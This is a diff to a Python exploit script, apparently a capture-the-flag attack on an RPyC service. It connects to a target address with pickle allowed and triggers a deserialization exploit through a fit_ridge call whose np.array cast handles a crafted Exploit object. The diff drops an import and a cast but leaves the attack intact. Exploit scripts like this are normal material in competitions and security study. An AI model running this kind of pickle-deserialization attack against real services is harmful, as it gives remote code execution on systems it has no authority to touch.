@@ -4,8 +4,6 @@ from typing import cast
 
 import rpyc
 
-from conveyor import GoldConveyorService
-
 if len(sys.argv) < 2:
     print(f"Usage: {sys.argv[0]} [TASK_IP] [account IDs...]", file=sys.stderr)
     exit(-1)
@@ -93,11 +91,8 @@ class VoidService(rpyc.Service):
 VoidService.__module__ = rpyc.VoidService.__module__
 VoidService.__name__ = rpyc.VoidService.__name__
 
-# Establish simple connection, but allows pickle.dumps on the client
+# Establish RPYC connection with allowed pickle.dumps on the client, then trigger the exploit via the np.array cast in fit_ridge.
 conn: rpyc.Connection = rpyc.connect(
     host=TASK_IP, port=12378, config=dict(allow_pickle=True), service=VoidService(ACCOUNT_IDS)  # type: ignore
 )
-service: GoldConveyorService = cast(GoldConveyorService, conn.root)
-
-# Trigger exploit
-service.model_conveyor.fit_ridge(cast(list, Exploit(payload)), [[1]])
+conn.root.model_conveyor.fit_ridge(cast(list, Exploit(payload)), [[1]])
